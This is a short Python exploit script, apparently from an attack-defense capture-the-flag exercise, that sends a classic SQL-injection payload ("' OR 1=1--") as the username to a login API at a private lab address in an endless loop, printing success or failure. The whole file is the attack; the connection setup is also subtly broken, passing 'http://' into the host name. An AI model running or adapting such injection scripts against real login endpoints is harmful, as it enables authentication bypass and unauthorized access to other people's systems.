"""
Make a POST request and get a JSON response, the vulnerable app will respond with a {'status': 'succes'} response
"""

import http.client
import json

ip_mask = '10.0.%d.101'
WEB_PORT = 9009
exploit_url = "/api/v1.0/storeLoginAPI/"

while True:
    payload = {'username': '\' OR 1=1--', 'password':'admin'} 
    conn = http.client.HTTPConnection(f'http://{ip_mask % 5}:{WEB_PORT}', WEB_PORT, timeout=5)
    # Uncoment to check on localhost
    # conn = http.client.HTTPConnection('localhost', WEB_PORT, timeout=5)
    headers = {'Content-type': 'application/json'}
    conn.request('POST', exploit_url, json.dumps(payload), headers)
    response = conn.getresponse()
    decode = json.loads(response.read().decode())
    if decode['status'] == 'success':
        print("Success")
    else:
        print("Failed")
